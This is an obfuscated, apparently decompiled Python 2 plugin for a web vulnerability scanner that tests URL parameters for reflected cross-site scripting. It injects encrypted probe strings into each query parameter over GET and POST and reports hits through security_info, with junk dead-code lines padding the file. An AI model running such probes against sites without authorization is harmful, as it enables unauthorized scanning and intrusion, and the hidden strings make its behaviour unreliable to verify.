#Embedded file name: xss.py
if __name__ == '__main__':
    from dummy import *
import re
import urlparse
import urllib
if 0:
    i11iIiiIii

def assign(service, arg):
    if service != '''www''':
        return
    OO0o = urlparse.urlparse(arg)
    Oo0Ooo = urlparse.parse_qsl(OO0o.query)
    for O0O0OO0O0O0, iiiii in Oo0Ooo:
        arg = arg.replace(iiiii, O0O0OO0O0O0)

    if urlparse.urlparse(arg).query.find('''=''') == -1 or len(Oo0Ooo) > 6:
        return
    else:
        return (True, arg)
    if 0:
        iIIi1iI1II111 + ii11i / oOooOoO0Oo0O


def iI1(method, action, query, k, v):
    i1I11i = [decode('u\xb4\t\x88,\x1dG\xec\x88\xe5c\xf9\xc1\x95\xf29\xc2A\xad(\xe8\x01\x05')]
    for OoOoOO00 in i1I11i:
        I11i = []
        for O0O, Oo in query:
            Oo = OoOoOO00 if O0O == k else Oo
            I11i.append((O0O, Oo))
            if 0:
                o0 * i1 * ii1IiI1i % OOooOOo / I11iIi1I / IiiIII111iI

        IiII = urllib.urlencode(I11i)
        iI1Ii11111iIi = None
        if method == decode('\x1f\xfec'):
            iI1Ii11111iIi = decode('w\xd3\x19\xa8x') % (action, IiII)
        elif method == decode('*\xdcR\xf4'):
            iI1Ii11111iIi = decode('u\xe6.\x99\x1dN`\xa6\x8d\xb6') % (IiII, action)
        else:
            return False
        i1i1II, O0oo0OO0, I1i1iiI1, iiIIIII1i1iI, iiIIIII1i1iI = curl.curl(decode('u\xec.') + iI1Ii11111iIi)
        if I1i1iiI1.find(decode('a\xed:\x9eBF<\xee\xd6\x9bA\xdc')) != -1 and I1i1iiI1.find(decode(')\x87\t\xbeF.g\xe8\xe0\xbe')) == -1:
            return (True, decode('w\xd3\x19\xa8x') % (action, IiII))
            if 0:
                o00ooo0 / Oo00O0


def audit(arg):
    ooO0oooOoO0 = arg
    II11i = urlparse.urlparse(ooO0oooOoO0)
    i1oOOoo00O0O = urlparse.urlunsplit((II11i.scheme,
     II11i.netloc,
     II11i.path,
     decode(''),
     decode('')))
    Oo0Ooo = urlparse.parse_qsl(II11i.query)
    i1111 = [decode('\x19\xd8C\xe3UG<\xeb\xc4\x8ft'), decode('<\xc7k\xdaUY\x05\xf7\xf8\xe1k'), decode('<\xc7k\xdaUY\x05\xf7\xf8\xe1{')]
    i11 = [decode('\x1f\xfec'), decode('*\xdcR\xf4')]
    for I11 in i11:
        for O0O0OO0O0O0, iiiii in Oo0Ooo:
            if O0O0OO0O0O0 in i1111:
                continue
            debug(decode('\x18\xe9R\xc5S:G\xb7\xe8\xe5-\x94\xc9\xdd\xa9\x14'), I11, O0O0OO0O0O0, i1oOOoo00O0O)
            Oo0o0000o0o0 = iI1(I11, i1oOOoo00O0O, Oo0Ooo, O0O0OO0O0O0, iiiii)
            if Oo0o0000o0o0:
                security_info(decode('a\xb6Z\x9e\x0c+4') % (I11, Oo0o0000o0o0[1]))
                return
                if 0:
                    iiiii11iII1 % O0o


if __name__ == '__main__':
    audit(assign('''www''', decode('f\xe5k\xfcH\x1cs\x95\xd9\x93Y\xc0\xf9\x9f\xfcC\xcbM\xe9x\xd7DB\xdc{(zX\xa9\xe0Nk#\xc7]\xca~\x19\x04\xe4\xd8\xf5N\xd5\xee\x8c\xaft\x8a,\x8bk\xb5EV\xbe'))[1])
    if 0:
        IIIII.I1

#KEY---6eaf26b1043248ae94ca258db5d5b068a610a213aa1d2af703532163d0bd1717---